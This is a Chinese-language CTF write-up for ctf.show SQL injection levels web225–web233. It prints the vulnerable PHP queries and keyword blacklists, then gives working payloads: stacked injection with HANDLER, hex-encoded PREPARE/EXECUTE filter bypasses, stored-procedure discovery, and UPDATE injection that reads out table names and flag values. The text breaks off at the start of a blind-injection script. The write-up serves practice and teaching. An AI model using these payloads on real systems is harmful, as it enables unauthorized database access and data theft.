<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web225">web225<a href="#web225" class="hash-link" aria-label="Direct link to web225" title="Direct link to web225">​</a></h3>
<p>堆叠注入</p>
<p>查询语句</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">  //分页查询</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  $sql = &quot;select id,username,pass from ctfshow_user where username = &#x27;{$username}&#x27;;&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>返回逻辑</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">  //师傅说过滤的越多越好</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  if(preg_match(&#x27;/file|into|dump|union|select|update|delete|alter|drop|create|describe|set/i&#x27;,$username)){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    die(json_encode($ret));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这和强网杯的那道随便注差不多，经典</p>
<p>一共有三种方法，分别是<strong>Handler</strong>、<strong>预处理语句</strong>、<strong>rename和alter</strong></p>
<p>然后这里过滤了alter，所以考虑前  面两种</p>
<p>然后发现输入框框不回显，于是直接去api那里</p>
<p>这里用handler</p>
<div class="language-mysql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-mysql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">HANDLER tbl_name OPEN [ [AS] alias]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HANDLER tbl_name READ index_name { = | &lt;= | &gt;= | &lt; | &gt; } (value1,value2,...)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    [ WHERE where_condition ] [LIMIT ... ]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    [ WHERE where_condition ] [LIMIT ... ]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HANDLER tbl_name READ { FIRST | NEXT }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    [ WHERE where_condition ] [LIMIT ... ]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HANDLER tbl_name CLOSE </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">http://4f2e6389-ceba-4b51-935f-21a413ceef5b.challenge.ctf.show/api/?username=%27;show%20databases;#</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>发现有回显，回显了ctfshow_web</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">?username=&#x27;;show tables;#</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>得到ctfshow_flagasa</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">?username=&#x27;;show columns from ctfshow_flagasa;#</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>得到flagas，其实上面的直接读就可以了</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">?username=&#x27;;handler ctfshow_flagasa open;handler ctfshow_flagasa read first;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>强网杯-随便注：<a href="https://blog.csdn.net/rfrder/article/details/108583338" target="_blank" rel="noopener noreferrer">https://blog.csdn.net/rfrder/article/details/108583338</a></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web226">web226<a href="#web226" class="hash-link" aria-label="Direct link to web226" title="Direct link to web226">​</a></h3>
<p>堆叠注入</p>
<p>查询语句</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">  //分页查询</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  $sql = &quot;select id,username,pass from ctfshow_user where username = &#x27;{$username}&#x27;;&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>返回逻辑</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">  //师傅说过滤的越多越好</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  if(preg_match(&#x27;/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|\(/i&#x27;,$username)){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    die(json_encode($ret));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这里过滤  了show，用预处理语句吧,注意这里ban掉了左括号，所以用16进制来绕过</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">&#x27;;prepare a from 0x73656c656374202a2066726f6d2063746673685f6f775f666c61676173;execute a;#</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web227">web227<a href="#web227" class="hash-link" aria-label="Direct link to web227" title="Direct link to web227">​</a></h3>
<p>堆叠注入提升 高级难度</p>
<p>查询语句</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">  //分页查询</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  $sql = &quot;select id,username,pass from ctfshow_user where username = &#x27;{$username}&#x27;;&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>返回逻辑</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">  //师傅说过滤的越多越好</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  if(preg_match(&#x27;/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|db|\,/i&#x27;,$username)){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    die(json_encode($ret));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>不会，看wp去了</p>
<p>information_schema.routines查看存储过程和函数</p>
<blockquote>
<p>存储过程（Stored Procedure）是一种在数据库中存储复杂程序，以便外部程序调用的一种数据库对象。</p>
<p>存储过程是为了完成特定功能的SQL语句集，经编译创建并保存在数据库中，用户可通过指定存储过程的名字并给定参数(需要时)来调用执行。</p>
<p>存储过程思想上很简单，就是数据库 SQL 语言层面的代码封装与重用。</p>
</blockquote>
<p>先还是用预处理，因为要查询select * from information_schema.routines</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">api/index.php?username=&#x27;;PREPARE a from 0x73656c656374202a2066726f6d20696e666f726d6174696f6e5f736368656d612e726f7574696e6573;EXECUTE a;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>此时已能看到flag，并且得到flag是写到getFlag中</p>
<p>调用他的方法就是&#x27;;call getFlag;</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web228229230">web228、229、230<a href="#web228229230" class="hash-link" aria-label="Direct link to web228、229、230" title="Direct link to web228、229、230">​</a></h3>
<p>方法同226</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">web228</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">?username=&#x27;;PREPARE a from 0x73656c656374202a2066726f6d2063746673685f6f775f666c616761736161;EXECUTE a;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">web229</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">?username=&#x27;;PREPARE a from 0x73656c656374202a2066726f6d20666c6167;EXECUTE a;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">web230</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">?username=&#x27;;PREPARE a from 0x73656c656374202a2066726f6d20666c61676161626278;EXECUTE a;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web231">web231<a href="#web231" class="hash-link" aria-label="Direct link to web231" title="Direct link to web231">​</a></h3>
<p>update注入</p>
<p>查询语句</p>
<div class="language-php· codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php· codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">  //分页查询</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  $sql = &quot;update ctfshow_user set pass = &#x27;{$password}&#x27; where username = &#x27;{$username}&#x27;;&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>可以看见这里就不是查询语句，而是用update来更新</p>
<p>注入点是api的password和username，都是  传POST</p>
<p>然后咱去POST一个password=1&#x27;,username=database()#&amp;username=1</p>
<p>刷新一下那个查询界面，就会发现，都变成了ctfshow_web</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">名</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">password=1&#x27;,username=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where 1=1#&amp;username=1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">名</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">password=1&#x27;,username=(select group_concat(column_name) from information_schema.columns where table_name=&#x27;flaga&#x27;) where 1=1#&amp;username=1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">字段</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">password=1&#x27;,username=(select flagas from flaga) where 1=1#&amp;username=1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web232">web232<a href="#web232" class="hash-link" aria-label="Direct link to web232" title="Direct link to web232">​</a></h3>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">//分页查询</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  $sql = &quot;update ctfshow_user set pass = md5(&#x27;{$password}&#x27;) where username = &#x27;{$username}&#x27;;&quot;;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>在231基础上改一下闭合即可</p>
<p>就是password=1&#x27;)</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">password=1&#x27;),username=(select flagass from flagaa) where 1=1#&amp;username=1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web233">web233<a href="#web233" class="hash-link" aria-label="Direct link to web233" title="Direct link to web233">​</a></h3>
<p>update注入</p>
<p>查询语句</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">  //分页查询</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  $sql = &quot;update ctfshow_user set pass = &#x27;{$password}&#x27; where username = &#x27;{$username}&#x27;;&quot;;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>我寻思吧，这和231有啥区别，没啥区别啊</p>
<p>然后用231的打一下，结果打不通。随着测试了一下，发现好像应该没啥过滤，而且题目也说没啥过滤，没办法只有采取盲注的姿势</p>
<p>然后注意这里查询是一行一行查询，所以sleep次数是行数</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> requests</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> time</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">url</span><span class="token operator" style="color:#393A34">=</span><span 